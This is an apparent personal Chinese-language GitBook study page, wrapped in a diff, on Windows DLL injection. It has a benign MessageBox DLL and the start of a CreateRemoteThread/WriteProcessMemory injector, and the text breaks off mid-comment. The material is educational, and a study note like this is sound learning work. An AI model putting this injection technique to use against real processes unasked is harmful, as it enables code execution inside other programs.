@@ -1,0 +1,1719 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Dll注入的3.5种方式 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-intopic-toc/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../Vulnerability_Mining.html" />
+    
+    
+    <link rel="prev" href="6种常见注入方式.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../构建gitbook.html">
+            
+                <a href="../构建gitbook.html">
+            
+                    
+                    写在开始，how2gitbook
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../Reverse.html">
+            
+                <a href="../Reverse.html">
+            
+                    
+                    Reverse
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Re/Windows消息队列.html">
+            
+                <a href="../Re/Windows消息队列.html">
+            
+                    
+                    windows 消息队列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../Re/常见加密算法-学习.html">
+            
+                <a href="../Re/常见加密算法-学习.html">
+            
+                    
+                    加密解密学习 - 更
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../Re/分组密码学习.html">
+            
+                <a href="../Re/分组密码学习.html">
+            
+                    
+                    分组密码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Re/vmp3.5unpacke.html">
+            
+                <a href="../Re/vmp3.5unpacke.html">
+            
+                    
+                    vmp3.X 工具向脱壳
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../Basics.html">
+            
+                <a href="../Basics.html">
+            
+                    
+                    Basics
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../Basics/elf文件结构.html">
+            
+                <a href="../Basics/elf文件结构.html">
+            
+                    
+                    ELF structure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../Basics/Pe File Structer.html">
+            
+                <a href="../Basics/Pe File Structer.html">
+            
+                    
+                    PE structure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../Basics/arm学习.html">
+            
+                <a href="../Basics/arm学习.html">
+            
+                    
+                    ARM 基础学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../Basics/Windows消息队列学习.html">
+            
+                <a href="../Basics/Windows消息队列学习.html">
+            
+                    
+                    Windows消息队列
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../Practice.html">
+            
+                <a href="../Practice.html">
+            
+                    
+                    Practice
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Practice/YouTubePremium.apk.html">
+            
+                <a href="../Practice/YouTubePremium.apk.html">
+            
+                    
+                    Malware-APK0
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../Dailynotes.html">
+            
+                <a href="../Dailynotes.html">
+            
+                    
+                    Daily notes
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Dailynotes/pdf解析重组.html">
+            
+                <a href="../Dailynotes/pdf解析重组.html">
+            
+                    
+                    电子书清晰化的尝试 利用python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../Dailynotes/ipv6_base_vps.html">
+            
+                <a href="../Dailynotes/ipv6_base_vps.html">
+            
+                    
+                    搭建ipv6自有服务器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../Dailynotes/learn_shell.html">
+            
+                <a href="../Dailynotes/learn_shell.html">
+            
+                    
+                    Shell 学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="../Dailynotes/就业意向.html">
+            
+                <a href="../Dailynotes/就业意向.html">
+            
+                    
+                    就业意向
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../Development.html">
+            
+                <a href="../Development.html">
+            
+                    
+                    Development
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../Development/find_dll_in_proc.html">
+            
+                <a href="../Development/find_dll_in_proc.html">
+            
+                    
+                    Find DLL in Process
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../Development/find_thread_in_process.html">
+            
+                <a href="../Development/find_thread_in_process.html">
+            
+                    
+                    Find Thread in Process
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../Development/Build-Arm.html">
+            
+                <a href="../Development/Build-Arm.html">
+            
+                    
+                    构建qemu的持续学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../Development/查看父进程.html">
+            
+                <a href="../Development/查看父进程.html">
+            
+                    
+                    查看父进程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../CyberSec.html">
+            
+                <a href="../CyberSec.html">
+            
+                    
+                    CyberSec
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="yara.html">
+            
+                <a href="yara.html">
+            
+                    
+                    YARA学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="关于bitcoin.html">
+            
+                <a href="关于bitcoin.html">
+            
+                    
+                    啥是Bitcoin
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="IOC-痛苦金字塔.html">
+            
+                <a href="IOC-痛苦金字塔.html">
+            
+                    
+                    从痛苦金字塔学习分析报告
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="PEB和TEB.html">
+            
+                <a href="PEB和TEB.html">
+            
+                    
+                    TEB & PEB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="进程注入-基础.html">
+            
+                <a href="进程注入-基础.html">
+            
+                    
+                    进程注入-前置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="6种常见注入方式.html">
+            
+                <a href="6种常见注入方式.html">
+            
+                    
+                    windows下的进程注入（6种）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.8.7" data-path="dll-inject.html">
+            
+                <a href="dll-inject.html">
+            
+                    
+                    Dll注入的3.5种方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../Vulnerability_Mining.html">
+            
+                <a href="../Vulnerability_Mining.html">
+            
+                    
+                    Vulnerability Mining
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../Vulnerability_Mining/Windows通用shellcode编写.html">
+            
+                <a href="../Vulnerability_Mining/Windows通用shellcode编写.html">
+            
+                    
+                    shellcode编写-地址定位
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../ToolUsage.html">
+            
+                <a href="../ToolUsage.html">
+            
+                    
+                    Tool usage
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../ToolUsage/Fiddler学习.html">
+            
+                <a href="../ToolUsage/Fiddler学习.html">
+            
+                    
+                    Fiddler学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../ToolUsage/windbg记录.html">
+            
+                <a href="../ToolUsage/windbg记录.html">
+            
+                    
+                    windbg使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Dll注入的3.5种方式</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p>dll&#x6CE8;&#x5165;&#x548C;&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;&#x90FD;&#x5C5E;&#x4E8E;&#x662F;&#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x4F46;&#x662F;&#x76F4;&#x63A5;&#x6CE8;&#x5165;dll&#x76F8;&#x6BD4;&#x4E8E;&#x6CE8;&#x5165;shellcode&#x6765;&#x8BF4;&#x4E0D;&#x7528;&#x53BB;&#x5173;&#x5FC3;api&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x548C;&#x4F4D;&#x7F6E;&#x65E0;&#x5173;&#x4EE3;&#x7801;&#x7684;&#x5B9A;&#x4F4D;&#x3002;</p>
+<p>&#x73AF;&#x5883;&#xFF1A;C&#x3001;Gcc&#x3001;Windows11</p>
+<p>&#x53C2;&#x8003;&#xFF1A;</p>
+<ul>
+<li>&#x300A;&#x9006;&#x5411;&#x5DE5;&#x7A0B;&#x6838;&#x5FC3;&#x539F;&#x7406;&#x300B;</li>
+<li><a href="https://xz.aliyun.com/t/10318#toc-6" target="_blank">https://xz.aliyun.com/t/10318#toc-6</a></li>
+<li>lll&#x54E5;</li>
+</ul>
+<h1 id="&#x7F16;&#x5199;dll">&#x7F16;&#x5199;dll</h1>
+<p>dll&#x6CE8;&#x5165;&#x9700;&#x8981;&#x5148;&#x51C6;&#x5907;&#x4E00;&#x4E2A;dll&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E2A;&#x53EF;&#x662F;&#x6BD4;&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;&#x7B80;&#x5355;&#x591A;&#x4E86;&#xFF0C;&#x7B80;&#x5355;&#x592A;&#x591A;&#x4E86;&#xFF0C;&#x518D;&#x4E5F;&#x4E0D;&#x7528;&#x4E3A;&#x4E86;&#x5199;shellcode&#x6076;&#x5FC3;&#x4E86;&#x3002;</p>
+<h2 id="dll&#x7A0B;&#x5E8F;&#x7ED3;&#x6784;&#xFF1A;">dll&#x7A0B;&#x5E8F;&#x7ED3;&#x6784;&#xFF1A;</h2>
+<h3 id="dllmain">DllMain</h3>
+<p>dll&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x5B58;&#x5728;DllMain&#x51FD;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x53EA;&#x5B58;&#x5728;&#x9700;&#x8981;&#x5BFC;&#x51FA;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
+<p>&#x4F46;&#x662F;&#x5728;dll&#x6CE8;&#x5165;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F53;dll&#x88AB;&#x6CE8;&#x5165;&#x5230;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E4B;&#x540E;&#xFF0C;dllmain&#x51FD;&#x6570;&#x4F1A;&#x88AB;&#x52A8;&#x6267;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x7F16;&#x5199;dll&#x6CE8;&#x5165;&#x7528;&#x7684;dll&#x5C31;&#x4E00;&#x5B9A;&#x9700;&#x8981;dllmain&#x3002;&#x76F8;&#x540C;&#x7684;&#xFF0C;&#x5F53;&#x6267;&#x884C;LoadLibrary&#x51FD;&#x6570;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x6267;&#x884C;dllmain&#x51FD;&#x6570;&#x3002;</p>
+<p>dllmain&#x6709;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x6CE8;&#x518C;&#x4E86;&#x56DB;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x7528;&#x6765;&#x8868;&#x793A;&#x56DB;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x72B6;&#x6001;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+
+<span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span>
+</span>{
+  <span class="hljs-keyword">switch</span> (fdwReason)
+  { 
+    <span class="hljs-comment">// &#x5C06;dll&#x6587;&#x4EF6;&#x9644;&#x52A0;&#x5230;&#x8FDB;&#x7A0B;&#xFF08;&#x52A0;&#x8F7D;&#x5230;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x65F6;&#xFF09;&#x3002;</span>
+      <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+    <span class="hljs-keyword">break</span>;
+    <span class="hljs-comment">// &#x5728;&#x8FDB;&#x7A0B;&#x4E2D;&#x521B;&#x5EFA;&#x4E86;&#x65B0;&#x7EBF;&#x7A0B;&#x4E4B;&#x540E;&#x4F1A;&#x6267;&#x884C;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
+      <span class="hljs-keyword">break</span>;
+
+    <span class="hljs-comment">// &#x8FDB;&#x7A0B;&#x4E2D;&#x7684;&#x7EBF;&#x7A0B;&#x9000;&#x51FA;&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
+      <span class="hljs-keyword">break</span>;
+    <span class="hljs-comment">// &#x5F53;dll&#x4ECE;&#x8FDB;&#x7A0B;&#x7A7A;&#x95F4;&#x8131;&#x79BB;&#xFF08;&#x9000;&#x51FA;&#xFF09;&#x65F6;&#x6267;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+      <span class="hljs-keyword">break</span>;
+  }
+  <span class="hljs-keyword">return</span> TRUE;
+}
+</code></pre>
+<h3 id="export-function">Export function</h3>
+<p>&#x5728;&#x524D;&#x9762;&#x58F0;&#x660E;&#x4E00;&#x4E0B;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x7EA6;&#x5B9A;&#xFF0C;&#x5229;&#x7528;<code>dllexport</code>&#x5173;&#x952E;&#x5B57;&#x6765;&#x8BF4;&#x660E;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x662F;&#x5BFC;&#x51FA;&#x51FD;&#x6570;&#x3002;</p>
+<pre><code class="lang-c">__declspec(dllexport) <span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">DownLoadFileFromUrl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span>
+</span>{
+    <span class="hljs-keyword">if</span>(i==<span class="hljs-number">1</span>)
+    {    
+        MessageBox(<span class="hljs-literal">NULL</span>, TEXT(<span class="hljs-string">&quot;start download file&quot;</span>), TEXT(<span class="hljs-string">&quot;title 2&quot;</span>), MB_OK);
+          <span class="hljs-keyword">return</span> RUN_SUCESS;
+    }
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i==<span class="hljs-number">2</span>)
+    {
+        MessageBox(<span class="hljs-literal">NULL</span>, TEXT(<span class="hljs-string">&quot;stop download file&quot;</span>), TEXT(<span class="hljs-string">&quot;title 2&quot;</span>), MB_OK);
+          <span class="hljs-keyword">return</span> RUN_SUCESS;
+    }
+
+}
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x5199;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x53E6;&#x5916;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;<code>.h</code>&#x6587;&#x4EF6;&#x6765;&#x8BF4;&#x660E;&#x3002;</p>
+<h2 id="&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;">&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</h2>
+<p>&#x5229;&#x7528;gcc&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#xFF0C;&#x4E0D;&#x8981;&#x7528;dev&#xFF0C;&#x4F1A;&#x51FA;&#x95EE;&#x9898;</p>
+<pre><code class="lang-shell">gcc -o MessageboxDll.dll -shared MessageboxDll.c
+</code></pre>
+<p>&#x5728;&#x8F7D;&#x5165;&#x8FDB;&#x7A0B;&#x548C;&#x8131;&#x79BB;&#x8FDB;&#x7A0B;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF0C;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RUN_SUCESS 0</span>
+
+__declspec(dllexport) <span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">DownLoadFileFromUrl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span>
+</span>{
+    <span class="hljs-keyword">if</span>(i==<span class="hljs-number">1</span>)
+    {
+        MessageBox(<span class="hljs-literal">NULL</span>, TEXT(<span class="hljs-string">&quot;start download file&quot;</span>), TEXT(<span class="hljs-string">&quot;title 2&quot;</span>), MB_OK);
+          <span class="hljs-keyword">return</span> RUN_SUCESS;
+    }
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i==<span class="hljs-number">2</span>)
+    {
+        MessageBox(<span class="hljs-literal">NULL</span>, TEXT(<span class="hljs-string">&quot;stop download file&quot;</span>), TEXT(<span class="hljs-string">&quot;title 2&quot;</span>), MB_OK);
+          <span class="hljs-keyword">return</span> RUN_SUCESS;
+    }
+
+}
+
+<span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span>
+</span>{
+  <span class="hljs-keyword">switch</span> (fdwReason)
+  { 
+    <span class="hljs-comment">// &#x5C06;dll&#x6587;&#x4EF6;&#x9644;&#x52A0;&#x5230;&#x8FDB;&#x7A0B;&#xFF08;&#x52A0;&#x8F7D;&#x5230;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x65F6;&#xFF09;&#x3002;</span>
+      <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+          DownLoadFileFromUrl(<span class="hljs-number">1</span>);
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-comment">// &#x5728;&#x8FDB;&#x7A0B;&#x4E2D;&#x521B;&#x5EFA;&#x4E86;&#x65B0;&#x7EBF;&#x7A0B;&#x4E4B;&#x540E;&#x4F1A;&#x6267;&#x884C;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
+          <span class="hljs-keyword">break</span>;
+
+    <span class="hljs-comment">// &#x8FDB;&#x7A0B;&#x4E2D;&#x7684;&#x7EBF;&#x7A0B;&#x9000;&#x51FA;&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
+          <span class="hljs-keyword">break</span>;
+    <span class="hljs-comment">// &#x5F53;dll&#x4ECE;&#x8FDB;&#x7A0B;&#x7A7A;&#x95F4;&#x8131;&#x79BB;&#xFF08;&#x9000;&#x51FA;&#xFF09;&#x65F6;&#x6267;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x3002;</span>
+    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+        DownLoadFileFromUrl(<span class="hljs-number">2</span>);
+        <span class="hljs-keyword">break</span>;
+  }
+  <span class="hljs-keyword">return</span> TRUE;
+}
+</code></pre>
+<h1 id="&#x6CE8;&#x5165;dll">&#x6CE8;&#x5165;dll</h1>
+<p>&#x6CE8;&#x5165;&#x8FDB;&#x7A0B;&#x62E5;&#x6709;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x5185;&#x5B58;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002;&#x6CE8;&#x5165;dll&#x4E3B;&#x8981;&#x6709;&#x4EE5;&#x4E0B;&#x4E09;&#x79CD;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<ul>
+<li>&#x521B;&#x5EFA;&#x8FDC;&#x7A0B;&#x7EBF;&#x7A0B;</li>
+<li>&#x4F7F;&#x7528;&#x6CE8;&#x518C;&#x8868;</li>
+<li>&#x6D88;&#x606F;HOOK</li>
+<li>APC&#x6CE8;&#x5165;</li>
+</ul>
+<h2 id="1&#x3001;&#x521B;&#x5EFA;&#x8FDC;&#x7A0B;&#x7EBF;&#x7A0B;">1&#x3001;&#x521B;&#x5EFA;&#x8FDC;&#x7A0B;&#x7EBF;&#x7A0B;</h2>
+<p>&#x5229;&#x7528;<code>CreateRemoteThread</code>API&#x8FDB;&#x884C;dll&#x6CE8;&#x5165;&#xFF0C;&#x8FD9;&#x4E2A;API&#x4E5F;&#x662F;&#x5728;&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;&#x4E2D;&#x5E38;&#x7528;&#x7684;API&#x3002;</p>
+<h3 id="&#x601D;&#x8DEF;">&#x601D;&#x8DEF;</h3>
+<ul>
+<li>&#x5C06;&#x8981;&#x6CE8;&#x5165;&#x7684;dll&#x7684;&#x8DEF;&#x5F84;&#x5199;&#x5165;&#x88AB;&#x6CE8;&#x5165;&#x8FDB;&#x7A0B;&#x7684;&#x5730;&#x5740;&#x3002;</li>
+<li>&#x901A;&#x8FC7;<code>CreateRemoteThread</code>api&#x5229;&#x7528;<code>Loadlibrary</code>api&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#xFF0C;&#x8F7D;&#x5165;dll&#x3002;</li>
+<li>&#x7ED3;&#x675F;</li>
+</ul>
+<h3 id="&#x5B9E;&#x73B0;&#x4EE3;&#x7801;">&#x5B9E;&#x73B0;&#x4EE3;&#x7801;</h3>
+<p>&#x4E0B;&#x5217;&#x7684;&#x4EE3;&#x7801;&#x5E76;&#x4E0D;&#x80FD;&#x6210;&#x529F;&#x6CE8;&#x5165;dll&#x7A0B;&#x5E8F;&#xFF0C;dll&#x7A0B;&#x5E8F;&#x662F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x7684;&#x3002;&#x4F46;&#x662F;writeprocessmemory&#x8FD9;&#x4E2A;api&#x662F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x7684;&#x3002;</p>
+<p>&#x5B57;&#x7B26;&#x4E32;&#x4E5F;&#x80FD;&#x5199;&#x8FDB;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x4E5F;&#x6B63;&#x5E38;&#xFF0C;&#x901A;&#x8FC7;&#x65AD;&#x70B9;&#x53D1;&#x73B0;&#x8C03;&#x7528;loadlibrary&#x51FD;&#x6570;&#x4E5F;&#x6B63;&#x5E38;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> notePID 1924</span>
+<span class="hljs-comment">//char* dllpath = &quot;C:\\Users\\rootkit\\Desktop\\dll&#x6CE8;&#x5165;\\MessageboxDll.dll&quot;;</span>
+<span class="hljs-keyword">char</span>* dllpath = <span class="hljs-string">&quot;C:\\Users\\rootkit\\Desktop\\32_MessageboxDll.dll&quot;</span>;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">size_t</span> dwsize = (<span class="hljs-built_in">strlen</span>(dllpath) + <span class="hljs-number">1</span>); <span class="hljs-comment">//* sizeof(TCHAR);</span>
+
+    <span class="hljs-comment">// &#x83B7;&#x53D6;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#xFF0C;&#x91C7;&#x7528;&#x6253;&#x5F00;&#x73B0;&#x6709;&#x8FDB;&#x7A0B;&#x7684;&#x5F62;&#x5F0F;</span>
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID);
+
+    <span class="hljs-comment">// &#x5728;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x5F00;&#x8F9F;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6CE8;&#x5165;&#x7684;dll&#x7684;&#x5730;&#x5740;</span>
+    LPVOID pRemotebuf= VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwsize, MEM_COMMIT, PAGE_READWRITE);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] VirtualAlloc sucess addr = %p\n&quot;</span>, pRemotebuf);
+
+    <span class="hljs-comment">// &#x5411;&#x5F00;&#x8F9F;&#x51FA;&#x6765;&#x7684;&#x5730;&#x5740;&#x5199;&#x5165;dll&#x8DEF;&#x5F84;</span>
+    WriteProcessMemory(hProcess, pRemotebuf, (LPCVOID)dllpath, dwsize, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] WriteProcessMemory sucess write dll path to target memroy \n&quot;</span>);
+
+    <span class="hljs-comment">/*
+    * &#x83B7;&#x53D6;loadlibrary&#x7684;&#x5730;&#x5740;&#x3002;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;
+    * 1&#x3001;&#x76F4;&#x63A5;&#x5728;&#x672C;&#x7A0B;&#x5E8F;&#x83B7;&#x5F97;&#xFF08;&#x5728;Windows&#x4E2D;&#x5171;&#x4EAB;&#x5E93;&#x7684;&#x5730;&#x5740;&#x662F;&#x4E00;&#x5B9A;&#x7684;&#xFF09;
